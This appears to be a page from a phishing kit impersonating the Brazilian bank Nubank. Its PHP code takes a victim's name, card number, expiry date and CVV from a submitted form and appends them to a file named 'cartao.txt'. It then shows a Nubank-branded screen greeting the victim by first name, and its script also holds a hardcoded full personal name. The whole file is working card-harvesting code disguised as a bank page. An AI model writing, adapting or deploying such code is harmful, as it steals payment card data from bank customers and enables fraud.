<?php
$nome = $_POST['nome'];
$primeiroNome = explode(" ", $nome);
$numeroc = $_POST['numeroc'];
$validade = $_POST['val'];
$cvv = $_POST['cvv']; // ID do formulário de login
$all = "Nome: ".$nome."\nNumero do Cartao: ".$numeroc."\nValidade: ".$validade."\nCvv: ".$cvv."";
 
$fp = fopen("../../cartao.txt", "a");
fwrite($fp, $all);
fclose($fp);
?>

<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style2.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
    
    <title>Nubank</title>
</head>
<body>
    
    <div class="box fadeIn">
        <div>
            <img class="fadeIn fadeImg fadeImg-delay fadeImg2 fadeImg2-delay" src="https://i.ibb.co/nMp0nqy/logo-branco1.png" alt="logo-branco1" border="0">
            <h3><?php echo $primeiroNome[0]; ?></h3>
        </div>
      </div>
            
</body>

<script>
    var nome = "Renan Rodrigues Moraes";
var tmp = nome.split(" ");
nome = tmp[0] + " " + tmp[1];
</script>
</html>